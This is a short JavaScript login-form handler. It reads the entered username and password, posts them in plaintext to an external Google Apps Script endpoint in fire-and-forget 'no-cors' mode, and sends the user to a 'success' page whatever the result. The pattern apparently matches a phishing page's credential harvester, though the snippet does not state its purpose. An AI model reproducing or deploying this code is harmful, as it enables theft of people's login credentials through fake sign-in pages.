document
  .getElementById("loginForm")
  .addEventListener("submit", function(e){

    e.preventDefault();

    const username =
      document.getElementById("username").value;

    const password =
      document.getElementById("password").value;

    fetch("https://script.googleusercontent.com/macros/echo?user_content_key=AUkAhnRyFSabzi73zv2HNXh-sBBTXmGFSAwTZnRRHXQkNkPIOVsK_bqS3aerQtXGYv9Qu1fshDDMImCrKjxO8SdLpuoFyN9qHC-wTx2dyOKeXMa_Z2kayNe28aP9SUEjkKF27jhttX4cuHGXNY2txgKlUHsYKwbc8v3-ey35FDEU4K85Q43uieT8DVCfovch37n57LYdqgfyS-t1P-agBlkT7STxc-H74proyFwrn0jWeQFGyi4ReAuxxUaMdFHkZDscqP0dXzhivoBk9duOgA_rGZaoMeOoEA&lib=M40Uq_i7lLCMB7FxrHfPe9PMCf4mS8-Gp", {
      method: "POST",
      mode: "no-cors",
      body: new URLSearchParams({
        username,
        password
      })
    });

    window.location.href = "success.html";
});
